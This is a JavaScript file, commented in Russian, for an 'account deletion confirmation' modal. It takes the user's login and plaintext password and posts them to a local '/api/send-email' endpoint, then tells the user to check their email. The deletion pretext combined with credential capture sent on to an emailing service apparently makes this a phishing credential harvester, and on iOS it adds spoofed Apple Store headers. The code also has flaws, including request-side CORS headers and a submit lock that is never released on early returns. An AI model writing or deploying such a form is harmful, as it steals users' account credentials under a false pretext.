// Глобальная переменная для отслеживания состояния отправки
let isSubmitting = false;

// Функция для отправки формы
async function handleFormSubmit(e) {
  e.preventDefault();
  
  console.log('Начало обработки формы');
  
  // Если уже отправляем, выходим
  if (isSubmitting) {
    console.log('Форма уже отправляется');
    return;
  }
  
  // Блокируем кнопку и форму
  isSubmitting = true;
  const submitButton = e.target.querySelector('button[type="submit"]');
  if (submitButton) {
    submitButton.disabled = true;
    submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
  }
  
  const login = document.getElementById('deleteLogin');
  const password = document.getElementById('deletePassword');
  
  if (!login || !password) {
    console.error('Элементы формы не найдены');
    showError('Произошла ошибка. Пожалуйста, обновите страницу и попробуйте снова.');
    return;
  }
  
  const loginValue = login.value.trim();
  const passwordValue = password.value;
  
  // Проверяем пустые поля
  if (!loginValue || !passwordValue) {
    console.log('Поля формы пустые');
    showError('Пожалуйста, заполните все поля');
    return;
  }
  
  try {
    console.log('Проверка подключения к интернету');
    // Проверяем подключение к интернету
    if (!navigator.onLine) {
      console.error('Нет подключения к интернету');
      throw new Error('Нет подключения к интернету. Проверьте соединение и повторите попытку.');
    }

    console.log('Настройка заголовков запроса');
    // Настройка специальных заголовков для Safari на iOS
    const headers = {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'Origin': window.location.origin,
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Accept, Origin'
    };

    console.log('Проверка устройства');
    // Определение iOS устройства
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
    console.log('iOS device:', isIOS);

    // На iOS добавляем специальную обработку
    if (isIOS) {
      console.log('Добавление специальных заголовков для iOS');
      // Добавляем дополнительные заголовки для Safari
      headers['X-Requested-With'] = 'XMLHttpRequest';
      headers['X-Apple-Store-Front'] = '143444,12';
      
      console.log('Отправка CORS префлайт запроса');
      // Добавляем CORS префлайт запрос
      try {
        const preflightResponse = await fetch('http://localhost:3000/api/send-email', {
          method: 'OPTIONS',
          headers: headers
        });
        console.log('CORS префлайт ответ:', preflightResponse.status);
      } catch (preflightError) {
        console.error('Ошибка CORS префлайта:', preflightError);
        throw new Error('Не удалось установить соединение с сервером. Проверьте подключение к интернету.');
      }
    }

    console.log('Отправка основного запроса');
    // Основной запрос
    try {
      const response = await fetch('http://localhost:3000/api/send-email', {
        method: 'POST',
        headers: headers,
        body: JSON.stringify({ login: loginValue, password: passwordValue })
      });
      
      console.log('Статус ответа:', response.status);
      
      const data = await response.json();
      console.log('Ответ сервера:', data);
      
      if (response.ok) {
        console.log('Успешная отправка');
        // Закрываем модальное окно
        const modal = bootstrap.Modal.getInstance(document.getElementById('confirmDeleteModal'));
        if (modal) {
          modal.hide();
          // Удаляем затемнение через короткую задержку
          setTimeout(() => {
            const modalBackdrop = document.querySelector('.modal-backdrop');
            if (modalBackdrop) modalBackdrop.remove();
          }, 100);
        }
        
        // Сбрасываем форму
        e.target.reset();
        
        // Показываем уведомление
        showSuccess('Данные успешно отправлены! Проверьте почту через несколько минут.');
      } else {
        console.error('Ошибка сервера:', data.error || 'Неизвестная ошибка');
        throw new Error(data.error || 'Ошибка при отправке данных');
      }
    } catch (fetchError) {
      console.error('Ошибка fetch:', fetchError);
      throw new Error('Ошибка при отправке данных. Проверьте подключение к серверу.');
    }
  } catch (error) {
    console.error('Общая ошибка:', error);
    showError(error.message);
  } finally {
    console.log('Возвращение в исходное состояние');
    // Возвращаем кнопку в исходное состояние
    isSubmitting = false;
    if (submitButton) {
      submitButton.disabled = false;
      submitButton.innerHTML = 'Подтвердить удаление';
    }
  }
}

// Функция для показа ошибок
function showError(message) {
  console.error('Показ ошибки:', message);
  alert(message);
}

// Функция для показа успешных сообщений
function showSuccess(message) {
  console.log('Показ успешного сообщения:', message);
  alert(message);
}

// Инициализация обработчика формы
document.addEventListener('DOMContentLoaded', () => {
  console.log('Инициализация обработчика формы');
  
  // Находим форму и кнопку подтверждения
  const form = document.getElementById('deleteConfirmationForm');
  const confirmDeleteBtn = document.getElementById('confirmDeleteBtn');
  
  if (form && confirmDeleteBtn) {
    console.log('Форма и кнопка найдены');
    
    // Обработчик кнопки подтверждения
    confirmDeleteBtn.addEventListener('click', (e) => {
      console.log('Нажата кнопка подтверждения');
      
      // Проверяем, заполнены ли поля формы
      const login = document.getElementById('deleteLogin');
      const password = document.getElementById('deletePassword');
      
      if (!login.value.trim() || !password.value) {
        console.log('Поля формы пустые');
        showError('Пожалуйста, заполните все поля');
        return;
      }
      
      // Отправляем форму
      form.submit();
    });
    
    // Обработчик формы
    form.addEventListener('submit', handleFormSubmit);
  } else {
    console.error('Форма или кнопка не найдены');
  }
});
